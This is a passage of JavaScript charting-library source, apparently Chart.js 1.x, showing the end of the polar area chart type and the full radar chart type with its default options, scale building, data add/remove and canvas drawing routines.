			});

			this.updateScaleRange(data);

			this.scale.update();

			helpers.each(data,function(segment,index){
				this.addData(segment,index,true);
			},this);

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];
					helpers.each(this.segments,function(segment){
						segment.restore(["fillColor"]);
					});
					helpers.each(activeSegments,function(activeSegment){
						activeSegment.fillColor = activeSegment.highlightColor;
					});
					this.showTooltip(activeSegments);
				});
			}

			this.render();
		},
		getSegmentsAtEvent : function(e){
			var segmentsArray = [];

			var location = helpers.getRelativePosition(e);

			helpers.each(this.segments,function(segment){
				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);
			},this);
			return segmentsArray;
		},
		addData : function(segment, atIndex, silent){
			var index = atIndex || this.segments.length;

			this.segments.splice(index, 0, new this.SegmentArc({
				fillColor: segment.color,
				highlightColor: segment.highlight || segment.color,
				label: segment.label,
				value: segment.value,
				outerRadius: (this.options.animateScale) ? 0 : this.scale.calculateCenterOffset(segment.value),
				circumference: (this.options.animateRotate) ? 0 : this.scale.getCircumference(),
				startAngle: Math.PI * 1.5
			}));
			if (!silent){
				this.reflow();
				this.update();
			}
		},
		removeData: function(atIndex){
			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;
			this.segments.splice(indexToDelete, 1);
			this.reflow();
			this.update();
		},
		calculateTotal: function(data){
			this.total = 0;
			helpers.each(data,function(segment){
				this.total += segment.value;
			},this);
			this.scale.valuesCount = this.segments.length;
		},
		updateScaleRange: function(datapoints){
			var valuesArray = [];
			helpers.each(datapoints,function(segment){
				valuesArray.push(segment.value);
			});

			var scaleSizes = (this.options.scaleOverride) ?
				{
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				} :
				helpers.calculateScaleRange(
					valuesArray,
					helpers.min([this.chart.width, this.chart.height])/2,
					this.options.scaleFontSize,
					this.options.scaleBeginAtZero,
					this.options.scaleIntegersOnly
				);

			helpers.extend(
				this.scale,
				scaleSizes,
				{
					size: helpers.min([this.chart.width, this.chart.height]),
					xCenter: this.chart.width/2,
					yCenter: this.chart.height/2
				}
			);

		},
		update : function(){
			this.calculateTotal(this.segments);

			helpers.each(this.segments,function(segment){
				segment.save();
			});
			
			this.reflow();
			this.render();
		},
		reflow : function(){
			helpers.extend(this.SegmentArc.prototype,{
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.updateScaleRange(this.segments);
			this.scale.update();

			helpers.extend(this.scale,{
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2
			});

			helpers.each(this.segments, function(segment){
				segment.update({
					outerRadius : this.scale.calculateCenterOffset(segment.value)
				});
			}, this);

		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			//Clear & draw the canvas
			this.clear();
			helpers.each(this.segments,function(segment, index){
				segment.transition({
					circumference : this.scale.getCircumference(),
					outerRadius : this.scale.calculateCenterOffset(segment.value)
				},easingDecimal);

				segment.endAngle = segment.startAngle + segment.circumference;

				// If we've removed the first segment we need to set the first one to
				// start at the top.
				if (index === 0){
					segment.startAngle = Math.PI * 1.5;
				}

				//Check to see if it's the last segment, if not get the next and update the start angle
				if (index < this.segments.length - 1){
					this.segments[index+1].startAngle = segment.endAngle;
				}
				segment.draw();
			}, this);
			this.scale.draw();
		}
	});

}).call(this);
(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;



	Chart.Type.extend({
		name: "Radar",
		defaults:{
			//Boolean - Whether to show lines for each scale point
			scaleShowLine : true,

			//Boolean - Whether we show the angle lines out of the radar
			angleShowLineOut : true,

			//Boolean - Whether to show labels on the scale
			scaleShowLabels : false,

			// Boolean - Whether the scale should begin at zero
			scaleBeginAtZero : true,

			//String - Colour of the angle line
			angleLineColor : "rgba(0,0,0,.1)",

			//Number - Pixel width of the angle line
			angleLineWidth : 1,

			//String - Point label font declaration
			pointLabelFontFamily : "'Arial'",

			//String - Point label font weight
			pointLabelFontStyle : "normal",

			//Number - Point label font size in pixels
			pointLabelFontSize : 10,

			//String - Point label font colour
			pointLabelFontColor : "#666",

			//Boolean - Whether to show a dot for each point
			pointDot : true,

			//Number - Radius of each point dot in pixels
			pointDotRadius : 3,

			//Number - Pixel width of point dot stroke
			pointDotStrokeWidth : 1,

			//Number - amount extra to add to the radius to cater for hit detection outside the drawn point
			pointHitDetectionRadius : 20,

			//Boolean - Whether to show a stroke for datasets
			datasetStroke : true,

			//Number - Pixel width of dataset stroke
			datasetStrokeWidth : 2,

			//Boolean - Whether to fill the dataset with a colour
			datasetFill : true,

			//String - A legend template
			legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

		},

		initialize: function(data){
			this.PointClass = Chart.Point.extend({
				strokeWidth : this.options.pointDotStrokeWidth,
				radius : this.options.pointDotRadius,
				display: this.options.pointDot,
				hitDetectionRadius : this.options.pointHitDetectionRadius,
				ctx : this.chart.ctx
			});

			this.datasets = [];

			this.buildScale(data);

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activePointsCollection = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];

					this.eachPoints(function(point){
						point.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activePointsCollection, function(activePoint){
						activePoint.fillColor = activePoint.highlightFill;
						activePoint.strokeColor = activePoint.highlightStroke;
					});

					this.showTooltip(activePointsCollection);
				});
			}

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset){

				var datasetObject = {
					label: dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					pointColor : dataset.pointColor,
					pointStrokeColor : dataset.pointStrokeColor,
					points : []
				};

				this.datasets.push(datasetObject);

				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					var pointPosition;
					if (!this.scale.animation){
						pointPosition = this.scale.getPointPosition(index, this.scale.calculateCenterOffset(dataPoint));
					}
					datasetObject.points.push(new this.PointClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						x: (this.options.animation) ? this.scale.xCenter : pointPosition.x,
						y: (this.options.animation) ? this.scale.yCenter : pointPosition.y,
						strokeColor : dataset.pointStrokeColor,
						fillColor : dataset.pointColor,
						highlightFill : dataset.pointHighlightFill || dataset.pointColor,
						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor
					}));
				},this);

			},this);

			this.render();
		},
		eachPoints : function(callback){
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,callback,this);
			},this);
		},

		getPointsAtEvent : function(evt){
			var mousePosition = helpers.getRelativePosition(evt),
				fromCenter = helpers.getAngleFromPoint({
					x: this.scale.xCenter,
					y: this.scale.yCenter
				}, mousePosition);

			var anglePerIndex = (Math.PI * 2) /this.scale.valuesCount,
				pointIndex = Math.round((fromCenter.angle - Math.PI * 1.5) / anglePerIndex),
				activePointsCollection = [];

			// If we're at the top, make the pointIndex 0 to get the first of the array.
			if (pointIndex >= this.scale.valuesCount || pointIndex < 0){
				pointIndex = 0;
			}

			if (fromCenter.distance <= this.scale.drawingArea){
				helpers.each(this.datasets, function(dataset){
					activePointsCollection.push(dataset.points[pointIndex]);
				});
			}

			return activePointsCollection;
		},

		buildScale : function(data){
			this.scale = new Chart.RadialScale({
				display: this.options.showScale,
				fontStyle: this.options.scaleFontStyle,
				fontSize: this.options.scaleFontSize,
				fontFamily: this.options.scaleFontFamily,
				fontColor: this.options.scaleFontColor,
				showLabels: this.options.scaleShowLabels,
				showLabelBackdrop: this.options.scaleShowLabelBackdrop,
				backdropColor: this.options.scaleBackdropColor,
				backdropPaddingY : this.options.scaleBackdropPaddingY,
				backdropPaddingX: this.options.scaleBackdropPaddingX,
				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,
				lineColor: this.options.scaleLineColor,
				angleLineColor : this.options.angleLineColor,
				angleLineWidth : (this.options.angleShowLineOut) ? this.options.angleLineWidth : 0,
				// Point labels at the edge of each line
				pointLabelFontColor : this.options.pointLabelFontColor,
				pointLabelFontSize : this.options.pointLabelFontSize,
				pointLabelFontFamily : this.options.pointLabelFontFamily,
				pointLabelFontStyle : this.options.pointLabelFontStyle,
				height : this.chart.height,
				width: this.chart.width,
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2,
				ctx : this.chart.ctx,
				templateString: this.options.scaleLabel,
				labels: data.labels,
				valuesCount: data.datasets[0].data.length
			});

			this.scale.setScaleSize();
			this.updateScaleRange(data.datasets);
			this.scale.buildYLabels();
		},
		updateScaleRange: function(datasets){
			var valuesArray = (function(){
				var totalDataArray = [];
				helpers.each(datasets,function(dataset){
					if (dataset.data){
						totalDataArray = totalDataArray.concat(dataset.data);
					}
					else {
						helpers.each(dataset.points, function(point){
							totalDataArray.push(point.value);
						});
					}
				});
				return totalDataArray;
			})();


			var scaleSizes = (this.options.scaleOverride) ?
				{
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				} :
				helpers.calculateScaleRange(
					valuesArray,
					helpers.min([this.chart.width, this.chart.height])/2,
					this.options.scaleFontSize,
					this.options.scaleBeginAtZero,
					this.options.scaleIntegersOnly
				);

			helpers.extend(
				this.scale,
				scaleSizes
			);

		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets
			this.scale.valuesCount++;
			helpers.each(valuesArray,function(value,datasetIndex){
				var pointPosition = this.scale.getPointPosition(this.scale.valuesCount, this.scale.calculateCenterOffset(value));
				this.datasets[datasetIndex].points.push(new this.PointClass({
					value : value,
					label : label,
					x: pointPosition.x,
					y: pointPosition.y,
					strokeColor : this.datasets[datasetIndex].pointStrokeColor,
					fillColor : this.datasets[datasetIndex].pointColor
				}));
			},this);

			this.scale.labels.push(label);

			this.reflow();

			this.update();
		},
		removeData : function(){
			this.scale.valuesCount--;
			this.scale.labels.shift();
			helpers.each(this.datasets,function(dataset){
				dataset.points.shift();
			},this);
			this.reflow();
			this.update();
		},
		update : function(){
			this.eachPoints(function(point){
				point.save();
			});
			this.reflow();
			this.render();
		},
		reflow: function(){
			helpers.extend(this.scale, {
				width : this.chart.width,
				height: this.chart.height,
				size : helpers.min([this.chart.width, this.chart.height]),
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2
			});
			this.updateScaleRange(this.datasets);
			this.scale.setScaleSize();
			this.scale.buildYLabels();
		},
		draw : function(ease){
			var easeDecimal = ease || 1,
				ctx = this.chart.ctx;
			this.clear();
			this.scale.draw();

			helpers.each(this.datasets,function(dataset){

				//Transition each point first so that the line and point drawing isn't out of sync
				helpers.each(dataset.points,function(point,index){
					if (point.hasValue()){
						point.transition(this.scale.getPointPosition(index, this.scale.calculateCenterOffset(point.value)), easeDecimal);
					}
				},this);



				//Draw the line between all the points
				ctx.lineWidth = this.options.datasetStrokeWidth;
				ctx.strokeStyle = dataset.strokeColor;
				ctx.beginPath();
				helpers.each(dataset.points,function(point,index){
					if (index === 0){
						ctx.moveTo(point.x,point.y);
					}
					else{
						ctx.lineTo(point.x,point.y);
					}
				},this);
				ctx.closePath();
				ctx.stroke();

				ctx.fillStyle = dataset.fillColor;
				ctx.fill();

				//Now draw the points over the line
				//A little inefficient double looping, but better than the line
				//lagging behind the point positions
				helpers.each(dataset.points,function(point){
					if (point.hasValue()){
						point.draw();
					}
				});

			},this);

		}

	});





}).call(this);